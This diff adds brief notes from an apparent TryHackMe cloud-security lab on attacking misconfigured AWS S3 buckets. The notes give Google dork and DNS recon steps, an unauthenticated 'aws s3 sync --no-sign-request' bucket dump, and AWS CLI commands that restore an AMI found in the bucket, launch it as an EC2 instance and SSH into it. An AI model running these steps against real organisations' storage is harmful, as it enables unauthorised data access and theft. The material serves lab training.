@@ -1,0 +1,70 @@
+AWS S3 - Attack and Defense
+
+Intro: S3 Bucket is a file storage system, it has a flat file structure - unlike most other file storage systems.
+
+ACLs are the original method for controlling access to S3 buckets. 
+--------------------------------------------------------------------------------------------
+CloudFront is the AWS Content Distribution Network (CDN), a CDN is a set of servers distributed around the world and designed to intelligently cache customer content.
+--------------------------------------------------------------------------------------------
+Subdomain recon
+
+1) Using google dorks
+For subdomain enumeration, you can use the following search in google
+org: bestcloudcompany site: s3.amazonaws.com
+
+2) Using DNS Recon
+Once we identified a hint from crt.sh associated to a subdomain we could use nslookup
+Command: nslookup assets.bestcloudcompany.org.s3.amazonaws.com
+--------------------------------------------------------------------------------------------
+Dumping S3 buckets
+
+Using the following command in the AWS CLI
+Command: aws s3 sync s3://{bucket-name} . --no-sign-request
+        
+Note: --no-sign-request means that you aren't using AWS credentials to sign the request. This proves that the bucket you are accessing is public.
+
+*Looks like there is at least one binary (.bin) file*
+--------------------------------------------------------------------------------------------
+S3: AWS Service substrate
+Offers unique opportunities to attack other AWS services with file storages and linked to S3 directly and permit simply by modifying the resources in a particular S3 bucket obtain privilege escalation.
+
+We identified a file with .bin extension associated to an AMI from the cloudbestcompany, so we want to recreate it
+
+1) Generate AMI from image bin
+Using the following command:
+aws ec2 create-restore-image-task --object-key {AMI_Object_ID}.bin --bucket assets.bestcloudcompany.org --name {Unique_Name} --region
+
+* SAVE IMAGE ID: "ami-064ea453ab76a748c"*
+
+2) Generate an ssh key pair with the following command
+aws ec2 create-key-pair --key-name {Your_Key_Name} --query "KeyMaterial" --output text > ~/.ssh/bestkeys.pem
+
+3) List Subnets and SG
+aws ec2 describe-subnets
+subnet-0db17ac6a93d849d3
+
+aws ec2 describe-security-groups
+sg-0901fc48410b076a3
+
+4) Recreate EC2 from AMI
+aws ec2 run-instances --image-id {ID_From_Restored_Image} --instance-type t3a.micro --key-name {Your_Key_Name} --subnet-id {SubnetA_SubnetID} --security-group-id {S3Room_TryHackMe_Security_Group}
+
+5) SSH into the EC2 instance
+ssh ec2-user@PUBLIC-IP -i file.pem
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
